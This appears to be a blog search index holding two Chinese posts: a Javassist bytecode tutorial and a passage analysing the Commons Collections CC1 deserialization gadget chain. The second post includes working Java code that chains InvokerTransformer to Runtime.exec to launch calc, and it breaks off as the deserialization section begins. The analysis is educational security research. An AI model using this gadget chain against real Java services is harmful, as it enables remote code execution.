<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>动态字节码</title>
      <link href="/2023/05/05/%E5%8A%A8%E6%80%81%E5%AD%97%E8%8A%82%E7%A0%81/"/>
      <url>/2023/05/05/%E5%8A%A8%E6%80%81%E5%AD%97%E8%8A%82%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>在Java中其字节码以二进制的形式存储在class文件中，每一个class文件都包含一个java类或接口，我们可以通过一些动态字节码技术去实现动态创建类、添加类的属性和方法、设置类的父类，以及修改类的方法等操作。常用的动态字节码类库有Javassist、ASM等。而Javassist相比ASM其不需要接触JVM底层的指令，只需要使用Javassist提供API接口就可以实现动态字节码编程，Mybatis动态是实现Dao接口底层也是使用到了Javassist技术，所以这篇文章主要介绍一下Javassist的使用。</p><h1 id="Javassist依赖导入"><a href="#Javassist依赖导入" class="headerlink" title="Javassist依赖导入"></a>Javassist依赖导入</h1><p>使用Javassist之前需要导入依赖，在Maven的pom添加如下依赖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;<span class="number">3.29</span><span class="number">.1</span>-GA&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h1 id="Javassist常用类"><a href="#Javassist常用类" class="headerlink" title="Javassist常用类"></a>Javassist常用类</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ClassPool：ClassPool 类可以控制的类的字节码，例如创建一个类或加载一个类，与 JVM 类装载器类似</span><br><span class="line">CtClass： CtClass提供了类的操作，如在类中动态添加新字段、方法和构造函数、以及改变类、父类和接口的方法</span><br><span class="line">CtField：类的属性，通过它可以给类创建新的属性，还可以修改已有的属性的类型，访问修饰符等</span><br><span class="line">CtMethod：表示类中的方法，通过它可以给类创建新的方法，还可以修改返回类型，访问修饰符等， 甚至还可以修改方法体内容代码</span><br><span class="line">CtConstructor：用于访问类的构造，与CtMethod类的作用类似</span><br></pre></td></tr></table></figure><h1 id="Javassist使用"><a href="#Javassist使用" class="headerlink" title="Javassist使用"></a>Javassist使用</h1><h2 id="添加方法"><a href="#添加方法" class="headerlink" title="添加方法"></a>添加方法</h2><p>看看如下一段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//获取类池</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">// 利用类池创建类</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;ysoserial.JavassistTest&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建方法</span></span><br><span class="line">        <span class="comment">// 1.返回值类型 2.方法名 3.形式参数列表 4.所属类</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtMethod</span>(CtClass.voidType, <span class="string">&quot;execute&quot;</span>, <span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, ctClass);</span><br><span class="line">        <span class="comment">// 设置方法的修饰符列表</span></span><br><span class="line">        ctMethod.setModifiers(Modifier.PUBLIC);</span><br><span class="line">        <span class="comment">// 设置方法体</span></span><br><span class="line">        ctMethod.setBody(<span class="string">&quot;&#123;System.out.println(\&quot;hello world\&quot;);&#125;&quot;</span>);</span><br><span class="line">        <span class="comment">// 给类添加方法</span></span><br><span class="line">        ctClass.addMethod(ctMethod);</span><br><span class="line">        <span class="comment">// 调用方法</span></span><br><span class="line">        Class&lt;?&gt; aClass = ctClass.toClass();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aClass.newInstance();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> aClass.getDeclaredMethod(<span class="string">&quot;execute&quot;</span>);</span><br><span class="line">        method.invoke(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先在代码的12行-14创建了一个类池，然后利用makeClass去创建一个类</p><p>当一个类已存在的时候，我们还可以利用getCtClass去获取这个类，然后对这个类进行动态修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass1</span> <span class="operator">=</span> classPool.getCtClass(<span class="string">&quot;ysoserial.JavassistTest&quot;</span>);</span><br></pre></td></tr></table></figure><p>在创建或获取一个类之后，我们通过会把这个对象赋值给一个ctClass句柄，然后通过ctClass句柄去操作这个类</p><p>代码的第17行利用CtMethod类添加一个execute方法，在new CtMethod里面依次有四个参数，分别为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CtClass.voidType  <span class="comment">//返回值的类型</span></span><br><span class="line"><span class="string">&quot;execute&quot;</span>  <span class="comment">//添加的方法名</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;  <span class="comment">//形参列表</span></span><br><span class="line">ctClass  <span class="comment">//所属类，也就是我们利用类池创建出来的那个类</span></span><br></pre></td></tr></table></figure><p>返回的参数类型，可以在CtClass这类的源码里面可以清晰查看</p><p><img src="/assets/image-20230505114400-y667iuv.png" alt="image.png"></p><p>代码的第19行设置我们之前定义的execute这个方法的访问修饰符</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctMethod.setModifiers(Modifier.PUBLIC);</span><br></pre></td></tr></table></figure><p>代码的第21行设置我们之前定义的execute这个方法体里面的内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctMethod.setBody(<span class="string">&quot;&#123;System.out.println(\&quot;hello world\&quot;);&#125;&quot;</span>);</span><br></pre></td></tr></table></figure><p>代码的第23行，把之前我们在方法里面设置好的东西全部添加到类当中去</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctClass.addMethod(ctMethod);</span><br></pre></td></tr></table></figure><p>代码的第25-26行转化为class类然后进行实例化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; aClass = ctClass.toClass();</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aClass.newInstance();</span><br></pre></td></tr></table></figure><p>代码的27-28行获取方法并执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> aClass.getDeclaredMethod(<span class="string">&quot;execute&quot;</span>);</span><br><span class="line">method.invoke(o);</span><br></pre></td></tr></table></figure><p>执行代码可以看到输出hello world</p><p><img src="/assets/image-20230505135209-yjwy1j6.png" alt="image.png"></p><h2 id="添加成员属性"><a href="#添加成员属性" class="headerlink" title="添加成员属性"></a>添加成员属性</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtField;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;ysoserial.JavassistTest&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//添加一个int类型的age变量</span></span><br><span class="line">        <span class="type">CtField</span> <span class="variable">ctField</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(CtClass.intType,<span class="string">&quot;age&quot;</span>,ctClass);</span><br><span class="line">        ctField.setModifiers(Modifier.PRIVATE);</span><br><span class="line">        ctClass.addField(ctField);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//添加一个String类型的name变量</span></span><br><span class="line">        <span class="type">CtField</span> <span class="variable">ctField2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(classPool.getCtClass(<span class="string">&quot;java.lang.String&quot;</span>), <span class="string">&quot;name&quot;</span> , ctClass);</span><br><span class="line">        ctField2.setModifiers(Modifier.PUBLIC);</span><br><span class="line">        ctClass.addField(ctField2);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> ctClass.toClass();</span><br><span class="line">        ctClass.writeFile();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> aClass.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="添加构造方法"><a href="#添加构造方法" class="headerlink" title="添加构造方法"></a>添加构造方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> javassist.CtField;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;ysoserial.JavassistTest&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//添加一个int类型的age变量</span></span><br><span class="line">        <span class="type">CtField</span> <span class="variable">ctField</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(CtClass.intType,<span class="string">&quot;age&quot;</span>,ctClass);</span><br><span class="line">        ctField.setModifiers(Modifier.PRIVATE);</span><br><span class="line">        ctClass.addField(ctField);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//添加一个String类型的name变量</span></span><br><span class="line">        <span class="type">CtField</span> <span class="variable">ctField2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(classPool.getCtClass(<span class="string">&quot;java.lang.String&quot;</span>), <span class="string">&quot;name&quot;</span> , ctClass);</span><br><span class="line">        ctField2.setModifiers(Modifier.PUBLIC);</span><br><span class="line">        ctClass.addField(ctField2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//添加有参构造</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">ctConstructor1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123; CtClass.intType, classPool.getCtClass(<span class="string">&quot;java.lang.String&quot;</span>)&#125;,ctClass);</span><br><span class="line">        ctConstructor1.setModifiers(Modifier.PUBLIC);</span><br><span class="line">        ctConstructor1.setBody(<span class="string">&quot;&#123;$0.age = $1;$0.name = $2;&#125;&quot;</span>);</span><br><span class="line">        ctClass.addConstructor(ctConstructor1);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> ctClass.toClass();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonCollections1反序列化链分析</title>
      <link href="/2023/05/02/CommonCollections1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/"/>
      <url>/2023/05/02/CommonCollections1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>CommonCollections1简称CC1链，Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。Commons Collections组件里面定义了一个Transformer接口，InvokerTransformer实现了Transformer接口，且可以执行任意方法，这也是CC1链中的主角。</p><h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><blockquote><p>java &lt; 8u71(再往后它的AnnotationInvocationHandler中readObject函数有改动)</p><p>CommonsCollections &lt;&#x3D; 3.2.1</p></blockquote><h1 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h1><p>网上CC1链的构造有两种，一个是使用TransformedMap类，另一个是利用到LazyMap类，先来看看较为简单的TransformedMap。</p><p>先看看如下一段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码运行结果如下</p><p><img src="/assets/image-20230430210904-os68tot.png" alt="image.png"></p><p>很明显执行了我们代码中定义的calc命令，那我们来逐行分析一下看看代码中是怎么执行命令的。</p><h2 id="TransformedMap-1"><a href="#TransformedMap-1" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  <span class="comment">//20行</span></span><br></pre></td></tr></table></figure><p>创建了一个HashMap对象赋值给innerMap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);  <span class="comment">//21行</span></span><br></pre></td></tr></table></figure><p>调用了TransformedMap里的decorate方法 ，且把innerMap 传了进来，后面两个参数我们稍后在分析，看看TransformedMap.decorate这个方法</p><p><img src="/assets/image-20230430211726-rjppwsl.png" alt="image.png"></p><p>new了一个TransformedMap，再跟进</p><p><img src="/assets/image-20230430211840-28xpiqf.png" alt="image.png"></p><p>把传进的参数进行赋值了，根据参数传递关系，这里的keyTransformer和valueTransformer分别为null和transformerChain。</p><p><img src="/assets/image-20230430212915-ewgytvl.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br></pre></td></tr></table></figure><p>根据outerMap.put方法看看里面做了什么</p><p><img src="/assets/image-20230430213319-bcq5eve.png" alt="image.png"></p><p>调用了transformKey和transformValue方法</p><p><img src="/assets/image-20230430213459-4hoke9m.png" alt="image.png"></p><p>判断是否等于null，是null的话就等于传进来的object，不是null，则执行keyTransformer和valueTransformer的transform方法。</p><p>那现在我们把第20行、21行、22行代码联系起来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  <span class="comment">//20行</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);  <span class="comment">//21行</span></span><br><span class="line">outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);  <span class="comment">//22行</span></span><br></pre></td></tr></table></figure><p>TransformedMap.decorate用来修饰innerMap，也就是我们创建的HashMap，当里面的值不为null且发生改变时触发TransformedMap里的回调函数keyTransformer和valueTransformer。</p><h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>这里触发了transformerChain回调函数，执行了transformerChain里面的transform方法，transformerChain是在第19行中创建出来的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  <span class="comment">//19行</span></span><br></pre></td></tr></table></figure><p>实例化了ChainedTransformer把transformers传入，transformers我们后看，先跟进ChainedTransformer看看里面的transform方法</p><p><img src="/assets/image-20230430215451-cxqjbcu.png" alt="image.png"></p><p>通过for循环把iTransformers数组遍历出来，依次调用transform方法，且是前⼀个回调返回的结果，作为后⼀个回调的参数传⼊。那我们去看看iTransformers也是我们第19 行代码传入的transformers里面定义。</p><p>其定义在14-18行</p><h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><p>创建一个ConstantTransformer实例，并把Runtime.getRuntime()获取到的对象传入，跟进</p><p>直接赋值，然后通过回调transform把赋值后的iConstant返回</p><p><img src="/assets/image-20230430225338-c9ck360.png" alt="image.png"></p><h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p>InvokerTransformer类是代码执行的关键，看看这里是怎么做的，创建一个InvokerTransformer，传入三个参数分别为（”exec”, new Class[]{String.class},new Object[]{“calc”}）跟进</p><p><img src="/assets/image-20230430225655-8kfs0xh.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依次赋值然后回调transform，然后通过反射执行iMethodName方法，这样就达到了执行exec该方法的目的</p><h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p>一个接口，里面定义了一个未实现的transform方法，其中ChainedTransformer、ConstantTransformer、InvokerTransformer都实现了Transformer接口</p><p><img src="/assets/image-20230430230204-oi0dke4.png" alt="image.png"></p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> 